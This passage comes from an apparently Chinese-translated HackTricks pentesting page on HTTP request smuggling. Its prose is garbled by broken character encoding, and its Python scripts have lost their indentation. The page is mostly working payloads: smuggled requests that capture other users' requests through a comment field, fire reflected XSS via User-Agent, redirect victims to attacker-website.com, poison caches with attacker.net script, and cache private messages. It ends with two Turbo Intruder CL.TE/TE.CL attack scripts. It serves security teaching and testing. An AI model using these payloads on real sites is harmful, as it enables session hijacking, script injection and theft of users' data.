`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**å‚æ•°commentçš„å€¼**å°†è¢«**ä¿å­˜åœ¨é¡µé¢ä¸Šä¸€ä¸ªå…¬å¼€å¯è§çš„å¸–å­çš„è¯„è®ºä¸­**ï¼Œå› æ­¤**å°†å‡ºç°ä¸€ä¸ªå¸¦æœ‰ä¸‹ä¸€ä¸ªè¯·æ±‚å†…å®¹çš„è¯„è®º**ã€‚

_è¿™ç§æŠ€æœ¯çš„ä¸€ä¸ªé™åˆ¶æ˜¯ï¼Œå®ƒé€šå¸¸åªèƒ½æ•è·åˆ°èµ°ç§è¯·æ±‚ä¸­é€‚ç”¨çš„å‚æ•°åˆ†éš”ç¬¦ä¹‹å‰çš„æ•°æ®ã€‚å¯¹äºURLç¼–ç çš„è¡¨å•æäº¤ï¼Œè¿™å°†æ˜¯`&`å­—ç¬¦ï¼Œè¿™æ„å‘³ç€ä»å—å®³ç”¨æˆ·è¯·æ±‚ä¸­å­˜å‚¨çš„å†…å®¹å°†åœ¨ç¬¬ä¸€ä¸ª`&`å¤„ç»“æŸï¼Œè¿™ç”šè‡³å¯èƒ½å‡ºç°åœ¨æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­ã€‚_

è¿˜è¯·æ³¨æ„ï¼Œè¿™ç§**æŠ€æœ¯ä¹Ÿå¯ä»¥åˆ©ç”¨TE.CL**æ¼æ´ï¼Œä½†è¯·æ±‚å¿…é¡»ä»¥`search=\r\n0`ç»“æŸã€‚ç„¶è€Œï¼Œæ— è®ºæ–°è¡Œå­—ç¬¦å¦‚ä½•ï¼Œå€¼éƒ½å°†è¢«é™„åŠ åˆ°æœç´¢å‚æ•°ã€‚

### åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§æ¥åˆ©ç”¨åå°„å‹XSS

å¦‚æœç½‘é¡µä¹Ÿ**å®¹æ˜“å—åˆ°åå°„å‹XSSçš„æ”»å‡»**ï¼Œæ‚¨å¯ä»¥æ»¥ç”¨HTTPè¯·æ±‚èµ°ç§æ¥æ”»å‡»ç½‘ç«™çš„å®¢æˆ·ç«¯ã€‚ä»HTTPè¯·æ±‚èµ°ç§åˆ©ç”¨åå°„å‹XSSæœ‰ä¸€äº›ä¼˜åŠ¿ï¼š

* **ä¸éœ€è¦ä¸å—å®³ç”¨æˆ·è¿›è¡Œäº’åŠ¨**
* å®ƒå¯ä»¥ç”¨æ¥**åˆ©ç”¨**åœ¨æ­£å¸¸åå°„å‹XSSæ”»å‡»ä¸­**æ— æ³•è½»æ˜“æ§åˆ¶çš„è¯·æ±‚éƒ¨åˆ†**çš„XSSè¡Œä¸ºï¼Œä¾‹å¦‚HTTPè¯·æ±‚å¤´éƒ¨ã€‚

å¦‚æœä¸€ä¸ªç½‘ç«™åœ¨User-Agentå¤´éƒ¨å®¹æ˜“å—åˆ°åå°„å‹XSSçš„æ”»å‡»ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè½½è·æ¥åˆ©ç”¨å®ƒï¼š

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§å°†ç«™å†…é‡å®šå‘å˜ä¸ºå¼€æ”¾é‡å®šå‘ <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

è®¸å¤šåº”ç”¨ç¨‹åºæ‰§è¡Œä»ä¸€ä¸ªURLåˆ°å¦ä¸€ä¸ªURLçš„ç«™å†…é‡å®šå‘ï¼Œå¹¶å°†è¯·æ±‚çš„`Host`å¤´éƒ¨ä¸­çš„ä¸»æœºåæ”¾å…¥é‡å®šå‘URLä¸­ã€‚ä¾‹å¦‚ï¼ŒApacheå’ŒIIS WebæœåŠ¡å™¨çš„é»˜è®¤è¡Œä¸ºï¼Œå½“è¯·æ±‚ä¸€ä¸ªæ²¡æœ‰å°¾éƒ¨æ–œæ çš„æ–‡ä»¶å¤¹æ—¶ï¼Œä¼šæ”¶åˆ°ä¸€ä¸ªé‡å®šå‘åˆ°åŒ…å«å°¾éƒ¨æ–œæ çš„åŒä¸€æ–‡ä»¶å¤¹çš„é‡å®šå‘ï¼š

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

è¿™ç§è¡Œä¸ºé€šå¸¸è¢«è®¤ä¸ºæ˜¯æ— å®³çš„ï¼Œä½†å®ƒå¯ä»¥åœ¨è¯·æ±‚èµ°ç§æ”»å‡»ä¸­è¢«åˆ©ç”¨ï¼Œå°†å…¶ä»–ç”¨æˆ·é‡å®šå‘åˆ°å¤–éƒ¨åŸŸã€‚ä¾‹å¦‚ï¼š

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

èµ°ç§çš„è¯·æ±‚å°†è§¦å‘é‡å®šå‘åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œè¿™å°†å½±å“åç«¯æœåŠ¡å™¨å¤„ç†çš„ä¸‹ä¸€ä¸ªç”¨æˆ·è¯·æ±‚ã€‚ä¾‹å¦‚ï¼š

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

åœ¨è¿™é‡Œï¼Œç”¨æˆ·è¯·æ±‚çš„æ˜¯ç½‘ç«™ä¸Šçš„é¡µé¢å¯¼å…¥çš„JavaScriptæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨å“åº”ä¸­è¿”å›ä»–ä»¬è‡ªå·±çš„JavaScriptæ¥å®Œå…¨å±å®³å—å®³ç”¨æˆ·ã€‚

### åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§æ‰§è¡ŒWebç¼“å­˜æŠ•æ¯’ <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

å¦‚æœ**å‰ç«¯åŸºç¡€è®¾æ–½çš„ä»»ä½•éƒ¨åˆ†æ‰§è¡Œå†…å®¹ç¼“å­˜**ï¼ˆé€šå¸¸å‡ºäºæ€§èƒ½åŸå› ï¼‰ï¼Œé‚£ä¹ˆ**å¯èƒ½å¯ä»¥é€šè¿‡ä¿®æ”¹æœåŠ¡å™¨çš„å“åº”æ¥æŠ•æ¯’è¯¥ç¼“å­˜**ã€‚

æˆ‘ä»¬å·²ç»çœ‹åˆ°äº†å¦‚ä½•ä¿®æ”¹æœåŠ¡å™¨è¿”å›çš„é¢„æœŸå€¼ä¸º404ï¼ˆåœ¨[åŸºæœ¬ç¤ºä¾‹](./#basic-examples)ä¸­ï¼‰ï¼Œä»¥ç±»ä¼¼çš„æ–¹å¼ï¼Œæ‚¨å¯ä»¥ä½¿æœåŠ¡å™¨åœ¨æŠ•æ¯’è¯·æ±‚è¯·æ±‚`/static/include.js`æ—¶è¿”å›`/index.html`çš„å†…å®¹ã€‚è¿™æ ·ï¼Œ`/static/include.js`çš„å†…å®¹å°†è¢«ç¼“å­˜ä¸º`/index.html`çš„å†…å®¹ï¼Œä½¿å¾—`/static/include.js`å¯¹å®¢æˆ·ç«¯ä¸å¯è®¿é—®ï¼ˆDoS?ï¼‰ã€‚

è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨å‘ç°ä¸€äº›**å¼€æ”¾é‡å®šå‘**æˆ–ä¸€äº›**ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**ï¼ˆä¸Šä¸€èŠ‚ï¼‰ï¼Œè¿™å°†æ›´åŠ æœ‰è¶£ã€‚å› ä¸ºï¼Œæ‚¨å¯ä»¥**æ›´æ”¹`/static/include.js`çš„ç¼“å­˜å€¼**ä¸º**ç”±æ‚¨æ§åˆ¶çš„è„šæœ¬çš„å€¼**ï¼ˆå¯¹æ‰€æœ‰å°è¯•ä¸‹è½½æ–°ç‰ˆæœ¬çš„`/static/include.js`çš„å®¢æˆ·ç«¯è¿›è¡Œ**æ™®éçš„XSSæ”»å‡»**ï¼‰ã€‚

åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œå°†å±•ç¤ºå¦‚ä½•åˆ©ç”¨**ç¼“å­˜æŠ•æ¯’+ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**æ¥ä¿®æ”¹`/static/include.js`çš„ç¼“å­˜å†…å®¹ï¼Œä»¥**æä¾›æ”»å‡»è€…æ§åˆ¶çš„JSä»£ç **ï¼š

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

æ³¨æ„åµŒå…¥çš„è¯·æ±‚æ˜¯è¯·æ±‚`/post/next?postId=3`ã€‚è¿™ä¸ªè¯·æ±‚å°†è¢«é‡å®šå‘åˆ°`/post?postId=4`ï¼Œå¹¶**å°†ä½¿ç”¨Hostå¤´éƒ¨çš„å€¼**æ¥æŒ‡ç¤ºåŸŸåã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥**ä¿®æ”¹Hostå¤´éƒ¨**æŒ‡å‘æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œé‡å®šå‘å°†ä½¿ç”¨è¯¥åŸŸåï¼ˆ**ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**ï¼‰ã€‚

ç„¶åï¼Œåœ¨**æŠ•æ¯’å¥—æ¥å­—**ä¹‹åï¼Œæ‚¨éœ€è¦å‘é€ä¸€ä¸ª**GETè¯·æ±‚**åˆ°**`/static/include.js`**ï¼Œè¿™ä¸ªè¯·æ±‚å°†è¢«**ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**è¯·æ±‚**æŠ•æ¯’**ï¼Œå¹¶å°†**æŠ“å–æ”»å‡»è€…æ§åˆ¶çš„è„šæœ¬çš„å†…å®¹**ã€‚

ä¸‹æ¬¡æœ‰äººè¯·æ±‚`/static/include.js`æ—¶ï¼Œå°†æä¾›æ”»å‡»è€…è„šæœ¬çš„ç¼“å­˜å†…å®¹ï¼ˆæ™®éçš„XSSï¼‰ã€‚

### åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§æ‰§è¡ŒWebç¼“å­˜æ¬ºéª— <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Webç¼“å­˜æŠ•æ¯’å’ŒWebç¼“å­˜æ¬ºéª—ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ**
>
> * åœ¨**Webç¼“å­˜æŠ•æ¯’**ä¸­ï¼Œæ”»å‡»è€…å¯¼è‡´åº”ç”¨ç¨‹åºåœ¨ç¼“å­˜ä¸­å­˜å‚¨ä¸€äº›æ¶æ„å†…å®¹ï¼Œè¿™äº›å†…å®¹ä»ç¼“å­˜ä¸­æä¾›ç»™å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚
> * åœ¨**Webç¼“å­˜æ¬ºéª—**ä¸­ï¼Œæ”»å‡»è€…å¯¼è‡´åº”ç”¨ç¨‹åºåœ¨ç¼“å­˜ä¸­å­˜å‚¨å±äºå¦ä¸€ä¸ªç”¨æˆ·çš„ä¸€äº›æ•æ„Ÿå†…å®¹ï¼Œç„¶åæ”»å‡»è€…ä»ç¼“å­˜ä¸­æ£€ç´¢è¿™äº›å†…å®¹ã€‚

åœ¨è¿™ç§å˜ä½“ä¸­ï¼Œæ”»å‡»è€…èµ°ç§äº†ä¸€ä¸ªè¿”å›ä¸€äº›æ•æ„Ÿçš„ç”¨æˆ·ç‰¹å®šå†…å®¹çš„è¯·æ±‚ã€‚ä¾‹å¦‚ï¼š

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`

å¦‚æœ**æŠ•æ¯’è¾¾åˆ°äº†æ­£åœ¨è®¿é—®ä¸€äº›é™æ€å†…å®¹**å¦‚`/someimage.png`çš„å®¢æˆ·ç«¯ï¼Œè¿™äº›å†…å®¹å°†è¢«**ç¼“å­˜**ã€‚å—å®³è€…çš„`/private/messages`å†…å®¹å°†è¢«ç¼“å­˜åœ¨`/someimage.png`ä¸­ï¼Œæ”»å‡»è€…å°†èƒ½å¤Ÿçªƒå–å®ƒä»¬ã€‚\
è¯·æ³¨æ„ï¼Œ**æ”»å‡»è€…ä¸çŸ¥é“å—å®³è€…è¯•å›¾è®¿é—®å“ªäº›é™æ€å†…å®¹**ï¼Œæ‰€ä»¥æµ‹è¯•è¿™ä¸ªå¯èƒ½çš„æœ€ä½³æ–¹å¼æ˜¯æ‰§è¡Œæ”»å‡»ï¼Œç­‰å¾…å‡ ç§’é’Ÿï¼Œ**åŠ è½½æ‰€æœ‰**é™æ€å†…å®¹å¹¶**æœç´¢ç§äººæ•°æ®**ã€‚

### åˆ©ç”¨HTTPå“åº”ä¸åŒæ­¥æ­¦å™¨åŒ–HTTPè¯·æ±‚èµ°ç§

æ‚¨å‘ç°äº†ä¸€äº›HTTPè¯·æ±‚èµ°ç§æ¼æ´ï¼Œä½†ä¸çŸ¥é“å¦‚ä½•åˆ©ç”¨å®ƒã€‚å°è¯•è¿™äº›å…¶ä»–åˆ©ç”¨æ–¹æ³•ï¼š

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Turbo intruder è„šæœ¬

### CL.TE

æ¥è‡ª [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

æ¥è‡ªï¼š[https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## æ›´å¤šä¿¡æ¯

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[å›¾ç‰‡æ¥æºäºæ­¤ã€‚](https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## å·¥å…·

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer)ï¼šæ­¤å·¥å…·æ˜¯ä¸€ä¸ªåŸºäºè¯­æ³•çš„HTTP Fuzzerï¼Œæœ‰åŠ©äºå‘ç°å¥‡æ€ªçš„è¯·æ±‚èµ°ç§å·®å¼‚ã€‚

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
